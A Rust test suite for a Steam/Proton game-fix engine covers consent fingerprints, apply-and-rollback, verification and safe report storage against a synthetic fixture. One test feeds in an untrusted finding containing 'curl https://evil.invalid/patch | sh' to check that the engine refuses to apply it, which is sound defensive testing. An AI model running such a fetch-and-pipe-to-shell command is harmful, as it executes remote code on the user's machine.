// Synthetic fixture Steam installation, isolated tempdir; no real games or logs.
use crate::resolution::{
    self,
    models::*,
    persistence::{Inputs, Store},
};

#[test]
fn resolution_availability_matches_preview_and_refreshes_operational_conditions() {
    use crate::fix_engine::availability::AvailabilityState;
    let fx = fixture();
    let e = fx.engine();
    let g = fx.game();
    let symptoms = vec!["startup".into()];
    let initial = report(&fx, &symptoms);
    let plan = initial.plans.iter().find(|p| p.recipe_id.as_deref() == Some("frx.diagnostics.proton-log")).unwrap();
    assert_eq!(plan.availability.state, AvailabilityState::Available);
    let preview = e.prepare(plan.recipe_id.as_ref().unwrap(), &g).unwrap();
    crate::commands::fix_engine::validate_listing(&preview, plan.availability.plan_fingerprint.as_deref()).unwrap();
    let original = std::fs::read(&fx.config).unwrap();

    fx.proc("2345", "wine64", "SteamAppId=200260\0");
    let blocked = report(&fx, &symptoms);
    let blocked = blocked.plans.iter().find(|p| p.id == plan.id).unwrap();
    assert_ne!(blocked.state, "applicable");
    assert_eq!(blocked.availability.state, AvailabilityState::Temporary);
    assert!(blocked.limitations.iter().any(|s| s.contains("jogo")));
    assert_eq!(std::fs::read(&fx.config).unwrap(), original);
    assert!(e.operations(None).is_empty());
}

#[test]
fn listing_fingerprint_rejects_changed_file_before_preview_consent() {
    let fx = fixture();
    let e = fx.engine();
    let g = fx.game();
    let available = e.availability("frx.diagnostics.proton-log", &g);
    fx.set_line("gamescope -f -- %command% --changed-after-listing");
    let original = std::fs::read(&fx.config).unwrap();
    let preview = e.prepare("frx.diagnostics.proton-log", &g).unwrap();
    let err = crate::commands::fix_engine::validate_listing(&preview, available.plan_fingerprint.as_deref()).unwrap_err();
    assert!(err.contains("mudaram desde a listagem"));
    assert_eq!(std::fs::read(&fx.config).unwrap(), original);
    assert!(e.operations(None).is_empty());
}

#[test]
fn legacy_resolution_report_does_not_inherit_executable_availability() {
    use crate::fix_engine::availability::AvailabilityState;
    let fx = fixture();
    let original = report(&fx, &["startup".into()]);
    let mut json = serde_json::to_value(&original).unwrap();
    for plan in json["plans"].as_array_mut().unwrap() {
        plan.as_object_mut().unwrap().remove("availability");
    }
    let loaded: Report = serde_json::from_value(json).unwrap();
    assert!(loaded.plans.iter().all(|p| p.availability.state == AvailabilityState::Investigation && p.availability.plan_fingerprint.is_none()));
    assert!(loaded.plans.iter().all(|p| p.recipe_id.is_some()));
}

fn report(fx: &Fx, symptoms: &[String]) -> Report {
    resolution::diagnose(&fx.engine(), &fx.game(), symptoms, None, vec![], &[]).unwrap()
}
#[test]
fn diagnostic_plan_preview_consent_apply_restart_verify_and_rollback() {
    let fx = fixture();
    let engine = fx.engine();
    let symptoms = vec!["startup".into()];
    let original = std::fs::read(&fx.config).unwrap();
    let initial = report(&fx, &symptoms);
    let plan = initial
        .plans
        .iter()
        .find(|p| p.recipe_id.as_deref() == Some("frx.diagnostics.proton-log"))
        .unwrap();
    assert_eq!(plan.state, "applicable");
    assert!(plan
        .sources
        .iter()
        .any(|s| s.kind == "official-documentation"));
    // Diagnosing and previewing never write game configuration.
    let preview = engine
        .prepare(plan.recipe_id.as_ref().unwrap(), &fx.game())
        .unwrap();
    assert_eq!(original, std::fs::read(&fx.config).unwrap());
    assert!(engine
        .apply(
            &preview.plan_id,
            "wrong-consent-fingerprint",
            &fx.game(),
            &|_| {}
        )
        .is_err());
    assert_eq!(original, std::fs::read(&fx.config).unwrap());
    let preview = engine
        .prepare(plan.recipe_id.as_ref().unwrap(), &fx.game())
        .unwrap();
    let op = engine
        .apply(&preview.plan_id, &preview.fingerprint, &fx.game(), &|_| {})
        .unwrap();
    assert_eq!(op.state, OpState::Applied);
    assert!(op
        .steps
        .iter()
        .all(|s| s.backup.as_ref().is_some_and(|b| b.path.is_file())));
    let mut applied = report(&fx, &symptoms);
    let active = applied.plans.iter().find(|p| p.id == plan.id).unwrap();
    assert_eq!(active.state, "applied-unverified");
    assert!(active.verification.contains("ainda não verificado"));
    resolution::verify(&engine, &mut applied, &plan.id).unwrap();
    assert_eq!(
        applied
            .plans
            .iter()
            .find(|p| p.id == plan.id)
            .unwrap()
            .state,
        "verified-configuration"
    );
    let store = Store::new(engine.root());
    store
        .save_inputs(
            "200260",
            &Inputs {
                symptoms: symptoms.clone(),
                ..Default::default()
            },
        )
        .unwrap();
    store.save_report(&applied).unwrap();
    drop(engine);
    let restarted = fx.engine();
    assert_eq!(
        Store::new(restarted.root())
            .report("200260")
            .unwrap()
            .unwrap(),
        applied
    );
    assert_eq!(
        Store::new(restarted.root())
            .inputs("200260")
            .unwrap()
            .symptoms,
        symptoms
    );
    assert!(Store::new(restarted.root())
        .report("999")
        .unwrap()
        .is_none());
    let undo = restarted.prepare_rollback(&op.id).unwrap();
    restarted
        .rollback(&op.id, &undo.fingerprint, &|_| {})
        .unwrap();
    assert_eq!(std::fs::read(&fx.config).unwrap(), original);
    assert_eq!(
        report(&fx, &symptoms)
            .plans
            .iter()
            .find(|p| p.id == plan.id)
            .unwrap()
            .state,
        "rolled-back"
    );
}
#[test]
fn dynamic_solution_reuses_engine_and_foreign_discovery_never_becomes_a_plan() {
    use crate::fixes::models::ActionKind;
    let fx = fixture();
    let e = fx.engine();
    let mut g = fx.game();
    g.gpu = Some(crate::fixes::models::GpuReq::Nvidia);
    let mut f = crate::fix_engine::dynamic::tests::finding(
        "synthetic-resolution",
        ActionKind::Env,
        "PROTON_ENABLE_NVAPI=1",
        2,
        0,
    );
    f.title = "SYNTHETIC FIXTURE: enable NVAPI for missing feature".into();
    g.findings = vec![f.clone()];
    let r = resolution::diagnose(&e, &g, &["dlss".into()], None, vec![], &[]).unwrap();
    let p = r.plans.iter().find(|p| p.title == f.title).unwrap();
    assert_eq!(p.state, "applicable", "{p:#?}");
    let recipe = p.recipe_id.as_ref().unwrap();
    let preview = e.prepare(recipe, &g).unwrap();
    let op = e
        .apply(&preview.plan_id, &preview.fingerprint, &g, &|_| {})
        .unwrap();
    assert_eq!(op.state, OpState::Applied);
    assert!(fx.line().unwrap().contains("PROTON_ENABLE_NVAPI=1"));
    let mut checked = resolution::diagnose(&e, &g, &[], None, vec![], &[]).unwrap();
    resolution::verify(&e, &mut checked, &p.id).unwrap();
    assert!(checked.plans.iter().all(|p| p.state != "resolved"));
    let undo = e.prepare_rollback(&op.id).unwrap();
    e.rollback(&op.id, &undo.fingerprint, &|_| {}).unwrap();
    f.game_app_id = "999".into();
    g.findings = vec![f];
    assert!(resolution::diagnose(&e, &g, &[], None, vec![], &[])
        .unwrap()
        .plans
        .is_empty());
}
#[test]
fn untrusted_source_cannot_add_shell_or_dll_actions_and_unknown_issue_has_no_fake_solution() {
    let fx = fixture();
    let e = fx.engine();
    let mut g = fx.game();
    g.findings = vec![crate::fix_engine::dynamic::tests::finding(
        "synthetic-hostile",
        crate::fixes::models::ActionKind::Other,
        "curl https://evil.invalid/patch | sh",
        10,
        0,
    )];
    let r = resolution::diagnose(&e, &g, &["physx".into()], None, vec![], &[]).unwrap();
    assert!(r.plans.iter().all(|p| p.state == "review"));
    assert!(e.operations(None).is_empty());
    g.findings.clear();
    let r = resolution::diagnose(&e, &g, &["physx".into()], None, vec![], &[]).unwrap();
    assert!(r.plans.is_empty());
    assert!(!r.problems.is_empty());
    assert!(
        resolution::diagnose(&e, &g, &["arbitrary-command".into()], None, vec![], &[]).is_err()
    );
}
#[test]
fn stale_plan_changes_and_external_drift_are_not_verification_success() {
    let fx = fixture();
    let e = fx.engine();
    let symptoms = vec!["crash".into()];
    let r = report(&fx, &symptoms);
    let p = r
        .plans
        .iter()
        .find(|p| p.recipe_id.as_deref() == Some("frx.diagnostics.proton-log"))
        .unwrap();
    let preview = e
        .prepare(p.recipe_id.as_ref().unwrap(), &fx.game())
        .unwrap();
    e.apply(&preview.plan_id, &preview.fingerprint, &fx.game(), &|_| {})
        .unwrap();
    fx.set_line("%command% -external-change");
    let mut changed = report(&fx, &symptoms);
    resolution::verify(&e, &mut changed, &p.id).unwrap();
    assert_eq!(
        changed.plans.iter().find(|x| x.id == p.id).unwrap().state,
        "error"
    );
}
#[test]
fn persistence_rejects_foreign_app_and_does_not_destroy_corrupt_or_legacy_reports() {
    let fx = fixture();
    let e = fx.engine();
    let store = Store::new(e.root());
    let r = report(&fx, &[]);
    store.save_report(&r).unwrap();
    let root = e.root().join("resolution");
    std::fs::copy(
        root.join("200260-report.json"),
        root.join("999-report.json"),
    )
    .unwrap();
    assert!(store.report("999").is_err());
    assert!(store.report("../../escape").is_err());
    let path = root.join("200260-report.json");
    std::fs::write(&path, "{legacy unknown data}").unwrap();
    assert!(store.report("200260").is_err());
    assert_eq!(
        std::fs::read_to_string(path).unwrap(),
        "{legacy unknown data}"
    );
}

#[test]
fn documented_component_upgrades_remain_reviewable_and_version_scoped() {
    let fx = fixture();
    let e = fx.engine();
    let mut g = fx.game();
    g.tool_name = Some("GE-Proton11-11".into());
    let knowledge = vec![Evidence {
        id: "synthetic-ge-document".into(),
        kind: "official-documentation".into(),
        summary: "SYNTHETIC FIXTURE: PROTON_DLSS_UPGRADE PROTON_FSR4_UPGRADE".into(),
        source_url: Some(
            "https://github.com/GloriousEggroll/proton-ge-custom/blob/GE-Proton11-11/README.md"
                .into(),
        ),
        publisher: Some("GloriousEggroll".into()),
        published_at: None,
        updated_at: None,
        fetched_at: crate::time::now_iso(),
        version: Some("GE-Proton11-11".into()),
        app_id: None,
        technology: Some("graphics-stack".into()),
        stale: false,
        limitations: vec![],
    }];
    let symptoms = vec!["dlss".into(), "fsr".into()];
    let r = resolution::diagnose(&e, &g, &symptoms, None, knowledge.clone(), &[]).unwrap();
    assert_eq!(r.plans.len(), 2);
    assert!(r
        .plans
        .iter()
        .all(|p| p.recipe_id.is_none() && !p.reversible && p.state == "review"));
    assert!(r.plans.iter().all(|p| p
        .limitations
        .iter()
        .any(|s| s.contains("versão selecionada encontrado"))));
    g.tool_name = Some("Proton 10.0".into());
    let r = resolution::diagnose(&e, &g, &symptoms, None, knowledge.clone(), &[]).unwrap();
    assert!(r
        .plans
        .iter()
        .all(|p| p.limitations.iter().any(|s| s.contains("não corresponde"))));
    let mut foreign = knowledge;
    foreign[0].app_id = Some("999".into());
    let r = resolution::diagnose(&e, &g, &symptoms, None, foreign, &[]).unwrap();
    assert!(r.knowledge.is_empty() && r.plans.is_empty());
}

#[test]
fn operation_with_changed_source_is_not_verified_as_the_new_resolution() {
    let fx = fixture();
    let e = fx.engine();
    let mut g = fx.game();
    g.gpu = Some(crate::fixes::models::GpuReq::Nvidia);
    let f = crate::fix_engine::dynamic::tests::finding(
        "synthetic-source-drift",
        crate::fixes::models::ActionKind::Env,
        "PROTON_ENABLE_NVAPI=1",
        2,
        0,
    );
    g.findings = vec![f];
    let r = resolution::diagnose(&e, &g, &[], None, vec![], &[]).unwrap();
    let p = &r.plans[0];
    let preview = e.prepare(p.recipe_id.as_ref().unwrap(), &g).unwrap();
    e.apply(&preview.plan_id, &preview.fingerprint, &g, &|_| {})
        .unwrap();
    g.findings[0].sources[0].snippet =
        Some("SYNTHETIC changed upstream context: PROTON_ENABLE_NVAPI=1".into());
    let mut changed = resolution::diagnose(&e, &g, &[], None, vec![], &[]).unwrap();
    let current = &changed.plans[0];
    // If an upstream change produces a new recipe identity, the older operation
    // must not be adopted. If identity is stable, fingerprint drift is an error.
    assert!(
        current.operation_id.is_none() || current.state == "error",
        "{current:#?}"
    );
    if current.operation_id.is_some() {
        let id = current.id.clone();
        resolution::verify(&e, &mut changed, &id).unwrap();
        assert_eq!(changed.plans[0].state, "error");
        assert!(changed.plans[0].reversible);
    }
}

#[test]
fn persistence_rejects_nested_foreign_scope_and_symlink_reports() {
    use std::os::unix::fs::symlink;
    let fx = fixture();
    let e = fx.engine();
    let store = Store::new(e.root());
    let mut r = report(&fx, &["startup".into()]);
    r.plans[0].app_id = "999".into();
    assert!(store.save_report(&r).is_err());
    let root = e.root().join("resolution");
    std::fs::create_dir_all(&root).unwrap();
    let outside = fx._tmp.path().join("outside.json");
    std::fs::write(&outside, "{}").unwrap();
    symlink(&outside, root.join("200260-report.json")).unwrap();
    assert!(store.report("200260").is_err());
    assert_eq!(std::fs::read_to_string(outside).unwrap(), "{}");
}

#[test]
fn hardware_change_keeps_original_operation_available_for_rollback() {
    let fx = fixture();
    let e = fx.engine();
    let mut g = fx.game();
    let before = fx.line();
    g.gpu = Some(crate::fixes::models::GpuReq::Nvidia);
    g.findings = vec![crate::fix_engine::dynamic::tests::finding(
        "synthetic-hardware-change",
        crate::fixes::models::ActionKind::Env,
        "PROTON_ENABLE_NVAPI=1",
        2,
        0,
    )];
    let report = resolution::diagnose(&e, &g, &[], None, vec![], &[]).unwrap();
    let preview = e
        .prepare(report.plans[0].recipe_id.as_ref().unwrap(), &g)
        .unwrap();
    let op = e
        .apply(&preview.plan_id, &preview.fingerprint, &g, &|_| {})
        .unwrap();
    g.gpu = Some(crate::fixes::models::GpuReq::Amd);
    let changed = resolution::diagnose(&e, &g, &[], None, vec![], &[]).unwrap();
    let plan = &changed.plans[0];
    assert!(plan.recipe_id.is_none());
    assert_eq!(plan.operation_id.as_deref(), Some(op.id.as_str()));
    assert_eq!(plan.state, "error");
    assert!(plan.reversible);
    let rollback = e.prepare_rollback(&op.id).unwrap();
    e.rollback(&op.id, &rollback.fingerprint, &|_| {}).unwrap();
    assert_eq!(fx.line(), before);
}
